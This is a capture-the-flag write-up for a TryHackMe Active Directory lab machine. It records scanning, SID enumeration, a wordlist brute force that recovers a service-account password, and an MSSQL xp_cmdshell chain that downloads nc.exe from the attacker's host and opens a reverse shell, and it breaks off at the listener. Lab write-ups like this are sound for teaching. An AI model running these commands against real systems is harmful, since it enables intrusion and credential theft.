---
layout: default
title : muzec - USTOUN Writeup
---

![image](https://user-images.githubusercontent.com/69868171/126145786-c7694317-7683-427b-a01a-54d09d027074.png)

```
Hey everyone and welcome to this CTF!

This CTF is a windows machine, more specifically, an active directory domain controller!

Please give the machine a minimum of 10 minutes to boot as some ports take some time to load!

Can you get in?
```

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```

```
# Nmap 7.91 scan initiated Sun Apr  4 08:25:23 2021 as: nmap -sC -sV -oA nmap 10.10.76.121
Nmap scan report for 10.10.76.121
Host is up (0.17s latency).
Not shown: 986 closed ports
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2021-04-04 15:26:08Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     tcpwrapped
1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: DC01
|   NetBIOS_Domain_Name: DC01
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: ustoun.local
|   DNS_Computer_Name: DC.ustoun.local
|   DNS_Tree_Name: ustoun.local
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-04-04T15:25:14
|_Not valid after:  2051-04-04T15:25:14
|_ssl-date: 2021-04-04T15:26:38+00:00; +3h00m01s from scanner time.
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: ustoun.local0., Site: Default-First-Site-Name)
3269/tcp  open     tcpwrapped
3389/tcp  open     ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: DC01
|   NetBIOS_Domain_Name: DC01
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: ustoun.local
|   DNS_Computer_Name: DC.ustoun.local
|   DNS_Tree_Name: ustoun.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-04-04T15:26:25+00:00
| ssl-cert: Subject: commonName=DC.ustoun.local
| Not valid before: 2021-01-31T19:39:34
|_Not valid after:  2021-08-02T19:39:34
|_ssl-date: 2021-04-04T15:26:37+00:00; +3h00m01s from scanner time.
12000/tcp filtered cce4x
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h59m59s, deviation: 2s, median: 2h59m59s
| ms-sql-info: 
|   10.10.76.121:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-04-04T15:26:23
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr  4 08:26:44 2021 -- 1 IP address (1 host up) scanned in 81.40 seconds
```

I love checking for Winrm Port now let scan for that.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ nmap -sV -p 5985 10.10.83.170
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-19 08:24 WAT
Nmap scan report for 10.10.83.170
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.33 seconds
```

We have confirm we have it open let start our enumeration. We are start with SMB make sure you add `'IP ustoun.local' >> /etc/hosts` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ smbclient -L //ustoun.local/ -N                

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
tstream_smbXcli_np_destructor: cli_close failed on pipe srvsvc. Error was NT_STATUS_IO_TIMEOUT
SMB1 disabled -- no workgroup available
```

Checking for anonymous access to SMB share.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ smbclient  //10.10.83.170/SYSVOL -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> exit
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ smbclient  //10.10.83.170/NETLOGON -N
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*
smb: \> 
```

Seems we have access using anonymous credentials but we can list anything let try to brute force SIDs using `lookupsid.py` from `impacket` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ lookupsid.py anonymous@10.10.83.170
Impacket v0.9.24.dev1+20210629.123513.142cacb6 - Copyright 2021 SecureAuth Corporation

Password:
[*] Brute forcing SIDs at 10.10.83.170
[*] StringBinding ncacn_np:10.10.83.170[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1901093607-1666369868-1126869414
498: DC01\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: DC01\Administrator (SidTypeUser)
501: DC01\Guest (SidTypeUser)
502: DC01\krbtgt (SidTypeUser)
512: DC01\Domain Admins (SidTypeGroup)
513: DC01\Domain Users (SidTypeGroup)
514: DC01\Domain Guests (SidTypeGroup)
515: DC01\Domain Computers (SidTypeGroup)
516: DC01\Domain Controllers (SidTypeGroup)
517: DC01\Cert Publishers (SidTypeAlias)
518: DC01\Schema Admins (SidTypeGroup)
519: DC01\Enterprise Admins (SidTypeGroup)
520: DC01\Group Policy Creator Owners (SidTypeGroup)
521: DC01\Read-only Domain Controllers (SidTypeGroup)
522: DC01\Cloneable Domain Controllers (SidTypeGroup)
525: DC01\Protected Users (SidTypeGroup)
526: DC01\Key Admins (SidTypeGroup)
527: DC01\Enterprise Key Admins (SidTypeGroup)
553: DC01\RAS and IAS Servers (SidTypeAlias)
571: DC01\Allowed RODC Password Replication Group (SidTypeAlias)
572: DC01\Denied RODC Password Replication Group (SidTypeAlias)
1000: DC01\DC$ (SidTypeUser)
1101: DC01\DnsAdmins (SidTypeAlias)
1102: DC01\DnsUpdateProxy (SidTypeGroup)
1112: DC01\SVC-Kerb (SidTypeUser)
1114: DC01\SQLServer2005SQLBrowserUser$DC (SidTypeAlias)
```

We only need the `SidTypeUser` save in a file.

```
Administrator
Guest
krbtgt
DC$
SVC-Kerb
```

We have a service account user `SVC-Kerb` cool let try to query for a ticket maybe it has pre-authentication disabled.

```
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ GetNPUsers.py -dc-ip ustoun.local ustoun.local/SVC-Kerb
Impacket v0.9.24.dev1+20210629.123513.142cacb6 - Copyright 2021 SecureAuth Corporation

Password:
[*] Cannot authenticate SVC-Kerb, getting its TGT
[-] User SVC-Kerb doesn't have UF_DONT_REQUIRE_PREAUTH set
                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ GetNPUsers.py -dc-ip ustoun.local ustoun.local/SVC-Kerb -no-pass
Impacket v0.9.24.dev1+20210629.123513.142cacb6 - Copyright 2021 SecureAuth Corporation

[*] Getting TGT for SVC-Kerb
[-] User SVC-Kerb doesn't have UF_DONT_REQUIRE_PREAUTH set
```

But we got no luck so what to do now i try brute forcing SMB with `crackmapexec` using the service account user `SVC-Kerb` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]                                                                                                              
└─$ crackmapexec smb ustoun.local -u 'SVC-Kerb' -p /usr/share/wordlists/rockyou.txt  
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:soccer STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:anthony STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:friends STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:butterfly STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:purple STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:angel STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:jordan STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:liverpool STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:justin STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:loveme STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:fuckyou STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:123123 STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:football STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:secret STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:andrea STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:carlos STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:jennifer STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:joshua STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:bubbles STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [-] ustoun.local\SVC-Kerb:1234567890 STATUS_LOGON_FAILURE 
SMB         10.10.83.170    445    DC               [+] ustoun.local\SVC-Kerb:superman 
```

Boom and we have the credentials now let try to log in SMB.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ smbclient //10.10.83.170/NETLOGON -U SVC-Kerb
Enter WORKGROUP\SVC-Kerb's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jan 30 18:28:07 2021
  ..                                  D        0  Sat Jan 30 18:28:07 2021

                12966143 blocks of size 4096. 8369584 blocks available
smb: \> 
```

We are in since we have Winrm port open i try using `evil-winrm` maybe i can get access to the target with the credentials i got from brute forcing SMB.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ evil-winrm -i 10.10.83.170 -u SVC-Kerb -p superman

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1

                                                                                                                                                                       
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ evil-winrm -i ustoun.local -u SVC-Kerb -p superman                                                                                                             1 ⨯

Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError

Error: Exiting with code 1
```

But no luck also going back to our nmap result seems we have `1433/tcp  open     ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM` open now back to `impacket` to use `mssqlclient.py` .

```
┌──(muzec㉿Muzec-Security)-[~/Documents/TryHackMe/USTOUN]
└─$ mssqlclient.py ustoun.local/svc-kerb:superman@10.10.83.170 
Impacket v0.9.24.dev1+20210629.123513.142cacb6 - Copyright 2021 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC): Line 1: Changed database context to 'master'.
[*] INFO(DC): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL> 
```

We are in cool right let try see if we can dump any more user hashes using `responder` .

```
sudo responder -I tun0 
```

![image](https://user-images.githubusercontent.com/69868171/126151916-bfc419b1-caeb-4e82-ba9b-811fa480fc6e.png)


We have set up now let start a `SimpleHTTPServer` on port 80.

```
sudo python -m SimpleHTTPServer 80
```

Now let run `xp_dirtree "\\10.8.0.156\fakeshare"` on the target. Going back to `responder` .

![image](https://user-images.githubusercontent.com/69868171/126152700-4c9ed7c4-58a1-4b15-b357-db6c1b0a614f.png)

Now we have the same user hash not what am expecting damn let just try and get a shell from the `SQL` . So i locate an ncat binary on my machine if you are on kali it should be in `/usr/share/seclists/Web-Shells/FuzzDB/nc.exe` if you have `seclists` installed now back to the target let create a directory to transfer the ncat binary to.

![image](https://user-images.githubusercontent.com/69868171/126156592-b454d44a-d894-411e-a629-67eb9b6ead87.png)

```
EXEC xp_cmdshell 'mkdir C:\tmp'
```

We have our `SimpleHTTPServer` running already on port 80. Now back to the target again.

```
EXEC xp_cmdshell 'powershell -c curl http://10.8.0.156/nc.exe -o C:\tmp\nc.exe'
```
On our target let start a listener `nc -nvlp 4444` .

Back to the target.

```
EXEC xp_cmdshell 'C:\tmp\nc.exe -e cmd 10.8.0.156 4444'
```

![image](https://user-images.githubusercontent.com/69868171/126157319-d9310f03-7145-454b-9cd5-914d7c1c9aa1.png)

Now let check our listener.

